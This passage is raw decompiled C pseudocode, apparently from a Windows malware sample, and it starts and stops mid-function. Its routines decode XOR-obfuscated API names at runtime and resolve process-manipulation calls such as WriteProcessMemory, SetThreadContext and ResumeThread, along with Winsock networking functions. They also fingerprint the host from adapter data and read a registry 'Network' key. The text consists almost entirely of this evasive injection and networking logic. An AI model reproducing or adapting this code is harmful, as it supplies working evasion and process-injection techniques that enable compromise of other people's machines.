    }
    local_80[0] = 0x7b7d6659;
    local_80[1] = 0x49636e7a;
    local_78 = 0x6a6a7d;
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_0041a170 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_0041a170 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x6e6a7d4c;
    local_80[1] = 0x7d5f6a7b;
    local_78 = 0x7c6a6c60;
    local_74 = CONCAT13(local_74._3_1_,0x4e7c);
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_00419fe0 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_00419fe0 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x5b7b6a48;
    local_80[1] = 0x6e6a7d67;
    local_78 = 0x61604c6b;
    local_74 = 0x7b776a7b;
    local_70 = local_70 & 0xffffff00;
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_0041a298 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_0041a298 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x6b6e6a5d;
    local_80[1] = 0x6c607d5f;
    local_78 = 0x427c7c6a;
    local_74 = 0x7d60626a;
    local_70._0_2_ = 0x76;
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_0041a290 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_0041a290 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x7b7d6659;
    local_80[1] = 0x4e636e7a;
    local_78 = 0x6c606363;
    local_74 = CONCAT13(local_74._3_1_,0x774a);
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_0041a2a4 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_0041a2a4 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x7b667d58;
    local_80[1] = 0x607d5f6a;
    local_78 = 0x7c7c6a6c;
    local_74 = 0x60626a42;
    local_70 = CONCAT13(local_70._3_1_,0x767d);
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_0041a188 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_0041a188 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x5b7b6a5c;
    local_80[1] = 0x6e6a7d67;
    local_78 = 0x61604c6b;
    local_74 = 0x7b776a7b;
    local_70 = local_70 & 0xffffff00;
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_00419f74 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_00419f74 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x627d6a5b;
    local_80[1] = 0x7b6e6166;
    local_78 = 0x607d5f6a;
    local_74 = 0x7c7c6a6c;
    local_70 = local_70 & 0xffffff00;
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_00419fe8 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_00419fe8 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x7a7c6a5d;
    local_80[1] = 0x675b6a62;
    local_78 = 0x6b6e6a7d;
    local_74 = local_74 & 0xffffff00;
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_00419f60 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_00419f60 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x6a636a4b;
    local_80[1] = 0x66496a7b;
    local_78 = 0x4e6a63;
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_00419ff0 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_00419ff0 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x7863677c;
    local_80[1] = 0x21667f6e;
    local_78 = 0x63636b;
    pCVar1 = (LPCSTR)FUN_00402090();
    pHVar2 = LoadLibraryA(pCVar1);
    if (pHVar2 != (HMODULE)0x0) {
      local_80[0] = 0x677b6e5f;
      local_80[1] = 0x6a636649;
      local_78 = 0x7c66774a;
      local_74 = 0x4e7c7b;
      pCVar1 = (LPCSTR)FUN_00402090();
      _DAT_0041a174 = GetProcAddress(pHVar2,pCVar1);
      if ((!bVar6) || (local_18 = 1, _DAT_0041a174 == (FARPROC)0x0)) {
        local_18 = 0;
      }
      local_80[0] = 0x6e796b4e;
      local_80[1] = 0x3d3c667f;
      local_78 = 0x63636b21;
      local_74 = local_74 & 0xffffff00;
      pCVar1 = (LPCSTR)FUN_00402090();
      local_1c = LoadLibraryA(pCVar1);
      if (local_1c != (HMODULE)0x0) {
        puVar4 = (uint *)&DAT_00415de0;
        puVar5 = local_80;
        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar5 = *puVar4;
          puVar4 = puVar4 + 1;
          puVar5 = puVar5 + 1;
        }
        *(undefined *)puVar5 = *(undefined *)puVar4;
        pCVar1 = (LPCSTR)FUN_00402090();
        _DAT_00419fe4 = GetProcAddress(local_1c,pCVar1);
        if ((local_18 == 0) || (_DAT_00419fe4 == (FARPROC)0x0)) {
          bVar6 = false;
        }
        else {
          bVar6 = true;
        }
        local_80[0] = 0x4a7b6a5c;
        local_80[1] = 0x667d7b61;
        local_78 = 0x61467c6a;
        local_74 = 0x4e636c4e;
        local_70 = local_70 & 0xffffff00;
        pCVar1 = (LPCSTR)FUN_00402090();
        pHVar2 = local_1c;
        _DAT_00419f3c = GetProcAddress(local_1c,pCVar1);
        if ((bVar6) && (_DAT_00419f3c != (FARPROC)0x0)) {
          bVar6 = true;
        }
        else {
          bVar6 = false;
        }
        local_80[0] = 0x417b6a5c;
        local_80[1] = 0x6b6a626e;
        local_78 = 0x7a6c6a5c;
        local_74 = 0x767b667d;
        local_70 = 0x60696146;
        local_6c = 0x4e;
        pCVar1 = (LPCSTR)FUN_00402090();
        _DAT_00419f54 = GetProcAddress(pHVar2,pCVar1);
        if ((bVar6) && (_DAT_00419f54 != (FARPROC)0x0)) {
          bVar6 = true;
        }
        else {
          bVar6 = false;
        }
        local_80[0] = 0x6e796b4e;
        local_80[1] = 0x3d3c667f;
        local_78 = 0x63636b21;
        local_74 = local_74 & 0xffffff00;
        pCVar1 = (LPCSTR)FUN_00402090();
        pHVar2 = LoadLibraryA(pCVar1);
        if (pHVar2 != (HMODULE)0x0) {
          local_80[0] = 0x4c686a5d;
          local_80[1] = 0x7b6e6a7d;
          local_78 = 0x766a446a;
          local_74._0_2_ = 0x4e;
          local_1c = pHVar2;
          pCVar1 = (LPCSTR)FUN_00402090();
          _DAT_0041a12c = GetProcAddress(pHVar2,pCVar1);
          if ((bVar6) && (_DAT_0041a12c != (FARPROC)0x0)) {
            bVar6 = true;
          }
          else {
            bVar6 = false;
          }
          local_80[0] = 0x5c686a5d;
          local_80[1] = 0x6e597b6a;
          local_78 = 0x4a6a7a63;
          local_74 = CONCAT13(local_74._3_1_,0x4e77);
          pCVar1 = (LPCSTR)FUN_00402090();
          DAT_0041a130 = GetProcAddress(pHVar2,pCVar1);
          if ((bVar6) && (DAT_0041a130 != (FARPROC)0x0)) {
            bVar6 = true;
          }
          else {
            bVar6 = false;
          }
          local_80[0] = 0x4c686a5d;
          local_80[1] = 0x6a7c6063;
          local_78 = 0x766a44;
          pCVar1 = (LPCSTR)FUN_00402090();
          DAT_0041a144 = GetProcAddress(pHVar2,pCVar1);
          if ((bVar6) && (DAT_0041a144 != (FARPROC)0x0)) {
            bVar6 = true;
          }
          else {
            bVar6 = false;
          }
          local_80[0] = 0x40686a5d;
          local_80[1] = 0x44616a7f;
          local_78 = 0x4e766a;
          pCVar1 = (LPCSTR)FUN_00402090();
          DAT_00419f5c = GetProcAddress(pHVar2,pCVar1);
          if ((bVar6) && (DAT_00419f5c != (FARPROC)0x0)) {
            bVar6 = true;
          }
          else {
            bVar6 = false;
          }
          local_80[0] = 0x5e686a5d;
          local_80[1] = 0x767d6a7a;
          local_78 = 0x7a636e59;
          local_74 = 0x4e774a6a;
          local_70 = local_70 & 0xffffff00;
          pCVar1 = (LPCSTR)FUN_00402090();
          DAT_00419f40 = GetProcAddress(pHVar2,pCVar1);
          if ((!bVar6) || (local_18 = 1, DAT_00419f40 == (FARPROC)0x0)) {
            local_18 = 0;
          }
          puVar4 = (uint *)&DAT_00415e78;
          puVar5 = local_80;
          for (iVar3 = 0xd; iVar3 != 0; iVar3 = iVar3 + -1) {
            *puVar5 = *puVar4;
            puVar4 = puVar4 + 1;
            puVar5 = puVar5 + 1;
          }
          *(undefined *)puVar5 = *(undefined *)puVar4;
          pCVar1 = (LPCSTR)FUN_00402090();
          _DAT_00419f6c = GetProcAddress(local_1c,pCVar1);
          if ((local_18 != 0) && (_DAT_00419f6c != (FARPROC)0x0)) {
            ExceptionList = local_10;
            return 1;
          }
        }
      }
    }
  }
  ExceptionList = local_10;
  return 0;
}



undefined4 Catch_00402c7f(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  return 0x402c8c;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00402ca0(void)

{
  HMODULE pHVar1;
  undefined4 *puVar2;
  bool bVar3;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  
  puVar2 = &local_64;
  local_64 = 0x503d7c58;
  local_5c._2_2_ = (ushort)(local_5c >> 0x10) & 0xff00;
  local_60 = 0x6b213d3c;
  local_5c = CONCAT22(local_5c._2_2_,0x6363);
  do {
    *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
    puVar2 = (undefined4 *)((int)puVar2 + 1);
  } while (*(byte *)puVar2 != 0);
  pHVar1 = LoadLibraryA((LPCSTR)&local_64);
  if (pHVar1 != (HMODULE)0x0) {
    local_60 = local_60 & 0xffffff00;
    local_64 = 0x796c6a7d;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_00419f58 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    bVar3 = DAT_00419f58 == (FARPROC)0x0;
    local_64 = 0x6b616a7c;
    local_60 = local_60 & 0xffffff00;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_00419f50 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) || (DAT_00419f50 == (FARPROC)0x0)) {
      bVar3 = false;
    }
    else {
      bVar3 = true;
    }
    local_64 = 0x61607b67;
    local_60 = CONCAT22(local_60._2_2_,0x7c);
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_0041a14c = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_0041a14c != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x6161606c;
    local_60 = 0x7b6c6a;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_00419f64 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_00419f64 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x646c607c;
    local_60 = CONCAT13(local_60._3_1_,0x7b6a);
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_0041a29c = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_0041a29c != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x677b6a68;
    local_5c = 0x626e6176;
    local_60 = 0x6d7b7c60;
    local_58._0_2_ = 0x6a;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_00419f4c = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_00419f4c != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x677b6a68;
    local_58 = CONCAT22(local_58._2_2_,0x6a);
    local_60 = 0x6d7b7c60;
    local_5c = 0x626e6176;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_00419f44 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_00419f44 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_60 = 0x6b6b6e50;
    local_64 = 0x7b6a6166;
    local_5c = CONCAT22(local_5c._2_2_,0x7d);
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_00419f70 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_00419f70 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x7c60636c;
    local_60 = 0x6c607c6a;
    local_5c = 0x7b6a64;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_0041a18c = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_0041a18c != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x617d6a64;
    local_5c = 0x63636b21;
    local_60 = 0x3d3c636a;
    local_58 = local_58 & 0xffffff00;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    pHVar1 = LoadLibraryA((LPCSTR)&local_64);
    local_64 = 0x7c60634c;
    local_60 = 0x616e476a;
    local_5c = 0x6a636b;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_0041a024 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_0041a024 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x7b666e58;
    local_60 = 0x6a626e41;
    local_5c = 0x7f665f6b;
    local_58 = CONCAT13(local_58._3_1_,0x4e6a);
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    _DAT_00419f48 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (_DAT_00419f48 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_5c = CONCAT22(local_5c._2_2_,0x6a);
    local_64 = 0x7b667d58;
    local_60 = 0x6366496a;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_0041a2ac = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_0041a2ac != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_60 = 0x6c607d5f;
    local_64 = 0x616a7f40;
    local_5c = 0x7c7c6a;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    _DAT_0041a294 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (_DAT_0041a294 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x6e6a7d4c;
    local_60 = 0x6a5d6a7b;
    local_5c = 0x6a7b6062;
    local_58 = 0x6a7d675b;
    local_54 = CONCAT13(local_54._3_1_,0x6b6e);
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    _DAT_0041a134 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (_DAT_0041a134 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x6e6a7d4c;
    local_5c = 0x6b6e6a7d;
    local_60 = 0x675b6a7b;
    local_58 = local_58 & 0xffffff00;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_00419ff4 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_00419ff4 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x7b7d6659;
    local_58 = local_58 & 0xffffff00;
    local_60 = 0x4e636e7a;
    local_5c = 0x6c606363;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    _DAT_0041a148 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (_DAT_0041a148 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_60 = 0x5c6a6366;
    local_64 = 0x497b6a48;
    local_5c = 0x6a7566;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    _DAT_00419f68 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (_DAT_00419f68 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x6b6e6a5d;
    local_60 = 0x6a636649;
    local_5c = local_5c & 0xffffff00;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    _DAT_0041a020 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (_DAT_0041a020 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x627d6a5b;
    local_60 = 0x7b6e6166;
    local_5c = 0x607d5f6a;
    local_58 = 0x7c7c6a6c;
    local_54 = local_54 & 0xffffff00;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    _DAT_00419fe8 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (_DAT_00419fe8 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x5b7b6a48;
    local_5c = 0x4e677b6e;
    local_60 = 0x5f7f626a;
    local_58 = local_58 & 0xffffff00;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_0041a160 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_0041a160 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x5b7b6a48;
    local_60 = 0x497f626a;
    local_58 = 0x4e6a626e;
    local_5c = 0x416a6366;
    local_54 = local_54 & 0xffffff00;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_00419fec = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_00419fec != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x4c7b6a48;
    local_60 = 0x6a7d7d7a;
    local_58 = 0x7c6a6c60;
    local_5c = 0x7d5f7b61;
    local_54 = CONCAT22(local_54._2_2_,0x7c);
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    _DAT_0041a164 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (_DAT_0041a164 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x6a636a5d;
    local_58 = local_58 & 0xffffff00;
    local_60 = 0x426a7c6e;
    local_5c = 0x776a7b7a;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    _DAT_0041a128 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (_DAT_0041a128 != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x597b6a48;
    local_60 = 0x667c7d6a;
    local_5c = 0x774a6160;
    local_58 = CONCAT22(local_58._2_2_,0x4e);
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    _DAT_0041a01c = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (_DAT_0041a01c != (FARPROC)0x0)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    local_64 = 0x7b666e58;
    local_60 = 0x5c7d6049;
    local_5c = 0x63686166;
    local_58 = 0x656d406a;
    local_54 = 0x7b6c6a;
    puVar2 = &local_64;
    do {
      *(byte *)puVar2 = *(byte *)puVar2 ^ 0xf;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    } while (*(byte *)puVar2 != 0);
    DAT_0041a150 = GetProcAddress(pHVar1,(LPCSTR)&local_64);
    if ((bVar3) && (DAT_0041a150 != (FARPROC)0x0)) {
      return 1;
    }
  }
  return 0;
}



void FUN_00403630(void)

{
  _OSVERSIONINFOA local_94;
  
  _memset(&local_94,0,0x94);
  local_94.dwOSVersionInfoSize = 0x94;
  GetVersionExA(&local_94);
  _sprintf(&DAT_0041a154,"%d.%d",local_94.dwMajorVersion,local_94.dwMinorVersion);
  return;
}



void __thiscall FUN_00403680(void *this,int param_1)

{
  uint in_EAX;
  int iVar1;
  int iVar2;
  int unaff_EDI;
  
  iVar2 = 0;
  if (0 < (int)this) {
    do {
      in_EAX = in_EAX + *(byte *)(iVar2 + unaff_EDI);
      iVar1 = 0x20;
      do {
        in_EAX = in_EAX + ((((in_EAX * 2 ^ in_EAX) & 0xfffffff8 ^ in_EAX * 8) << 4 ^
                           in_EAX & 0xffffff80) << 0x11 | in_EAX >> 8);
        iVar1 = iVar1 + -1;
      } while (iVar1 != 0);
      iVar2 = iVar2 + 1;
    } while (iVar2 < (int)this);
  }
  iVar2 = 0;
  do {
    in_EAX = in_EAX + ((((in_EAX * 2 ^ in_EAX) & 0xfffffff8 ^ in_EAX * 8) << 4 ^ in_EAX & 0xffffff80
                       ) << 0x11 | in_EAX >> 8);
    *(char *)(iVar2 + param_1) = (char)in_EAX;
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x10);
  return;
}



undefined4 FUN_00403710(void)

{
  char cVar1;
  HMODULE pHVar2;
  FARPROC pFVar3;
  FARPROC pFVar4;
  void *_Memory;
  undefined4 *_Memory_00;
  int iVar5;
  char *pcVar6;
  char *pcVar7;
  undefined4 *puVar8;
  size_t unaff_EDI;
  uint uVar9;
  undefined4 local_178;
  undefined4 local_174;
  undefined4 local_170;
  undefined4 local_16c;
  uint local_168;
  undefined local_164;
  byte abStack_128 [16];
  char acStack_118 [24];
  undefined local_100 [256];
  
  local_174 = 0x617d6a64;
  local_168 = local_168 & 0xffffff00;
  local_170 = 0x3d3c636a;
  local_16c = 0x63636b21;
  puVar8 = &local_174;
  do {
    *(byte *)puVar8 = *(byte *)puVar8 ^ 0xf;
    puVar8 = (undefined4 *)((int)puVar8 + 1);
  } while (*(byte *)puVar8 != 0);
  pHVar2 = LoadLibraryA((LPCSTR)&local_174);
  local_174 = 0x4c7b6a48;
  local_170 = 0x7a7f6260;
  local_16c = 0x417d6a7b;
  local_168 = 0x4e6a626e;
  local_178 = 0x100;
  local_164 = 0;
  puVar8 = &local_174;
  do {
    *(byte *)puVar8 = *(byte *)puVar8 ^ 0xf;
    puVar8 = (undefined4 *)((int)puVar8 + 1);
  } while (*(byte *)puVar8 != 0);
  pFVar3 = GetProcAddress(pHVar2,(LPCSTR)&local_174);
  local_174 = 0x63677f46;
  local_170 = 0x667f6e7f;
  local_16c = 0x63636b21;
  local_168 = local_168 & 0xffffff00;
  puVar8 = &local_174;
  do {
    *(byte *)puVar8 = *(byte *)puVar8 ^ 0xf;
    puVar8 = (undefined4 *)((int)puVar8 + 1);
  } while (*(byte *)puVar8 != 0);
  pHVar2 = LoadLibraryA((LPCSTR)&local_174);
  local_174 = 0x4e7b6a48;
  local_170 = 0x7b7f6e6b;
  local_16c = 0x467c7d6a;
  local_168 = 0x606961;
  puVar8 = &local_174;
  do {
    *(byte *)puVar8 = *(byte *)puVar8 ^ 0xf;
    puVar8 = (undefined4 *)((int)puVar8 + 1);
  } while (*(byte *)puVar8 != 0);
  pFVar4 = GetProcAddress(pHVar2,(LPCSTR)&local_174);
  if ((pFVar3 != (FARPROC)0x0) && (pFVar4 != (FARPROC)0x0)) {
    (*pFVar3)(local_100,&local_178);
    _Memory = _malloc(0x288);
    if (_Memory != (void *)0x0) {
      (*pFVar4)(_Memory,&stack0xfffffe80);
      _Memory_00 = (undefined4 *)_realloc(_Memory,unaff_EDI);
      iVar5 = (*pFVar4)(_Memory_00,&stack0xfffffe78);
      puVar8 = _Memory_00;
      if (iVar5 == 0) {
        for (; puVar8 != (undefined4 *)0x0; puVar8 = (undefined4 *)*puVar8) {
          uVar9 = 0;
          if (puVar8[100] != 0) {
            do {
              pcVar6 = acStack_118;
              do {
                cVar1 = *pcVar6;
                pcVar6 = pcVar6 + 1;
              } while (cVar1 != '\0');
              if (0xe6 < (uint)((int)pcVar6 - (int)(acStack_118 + 1))) break;
              pcVar6 = acStack_118;
              do {
                pcVar7 = pcVar6;
                pcVar6 = pcVar7 + 1;
              } while (*pcVar7 != '\0');
              _sprintf(pcVar7,"%2.2X",(uint)*(byte *)((int)puVar8 + uVar9 + 0x194));
              uVar9 = uVar9 + 1;
            } while (uVar9 < (uint)puVar8[100]);
          }
          pcVar6 = acStack_118;
          do {
            cVar1 = *pcVar6;
            pcVar6 = pcVar6 + 1;
          } while (cVar1 != '\0');
          if (0xe6 < (uint)((int)pcVar6 - (int)(acStack_118 + 1))) break;
          pcVar6 = acStack_118;
          do {
            pcVar7 = pcVar6;
            pcVar6 = pcVar7 + 1;
          } while (*pcVar7 != '\0');
          _sprintf(pcVar7,(char *)&DAT_00416008,puVar8 + 2);
        }
        _free(_Memory_00);
        pcVar6 = acStack_118;
        do {
          cVar1 = *pcVar6;
          pcVar6 = pcVar6 + 1;
        } while (cVar1 != '\0');
        FUN_00403680(pcVar6 + -(int)(acStack_118 + 1),(int)abStack_128);
        FUN_00401080();
        iVar5 = 0;
        pcVar6 = &DAT_00419ff8;
        do {
          _sprintf(pcVar6,"%2.2X",(uint)abStack_128[iVar5]);
          pcVar6 = pcVar6 + 2;
          iVar5 = iVar5 + 1;
        } while ((int)pcVar6 < 0x41a018);
      }
    }
  }
  return 0;
}



undefined4 FUN_00403a20(void)

{
  int iVar1;
  void *_Src;
  void *this;
  undefined4 uVar2;
  undefined *puStack_4c;
  undefined4 uStack_48;
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_2c;
  undefined *puStack_28;
  char **ppcStack_24;
  undefined4 uStack_20;
  char *pcStack_1c;
  undefined *puStack_18;
  undefined local_c [12];
  
  puStack_18 = local_c;
  pcStack_1c = "Network";
  uStack_20 = 0x80000001;
